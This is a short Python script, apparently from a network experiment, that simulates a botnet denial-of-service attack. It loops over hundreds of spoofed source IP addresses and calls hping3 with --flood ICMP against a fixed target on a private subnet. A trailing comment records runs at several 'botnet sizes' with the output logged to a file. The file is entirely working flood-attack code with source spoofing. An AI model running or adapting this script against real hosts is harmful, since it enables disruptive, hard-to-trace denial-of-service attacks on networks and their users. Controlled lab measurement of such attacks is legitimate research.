import os
import ipaddress

startip="192.168.40.1"
waittime=5
botnetsize=421# 355 #401 #302
for x in range(0,botnetsize):
    ip =ipaddress.ip_address(startip)+x
    os.system("sudo timeout "+str(waittime)+"  hping3 --flood -1 192.168.57.11 --spoof "+str(ip))

#executed with python pingflood.py &>> packetstransmitted.txt, once with botnetsize= 421, botnetsize =355, botnetsize =401 and botnetsize = 302 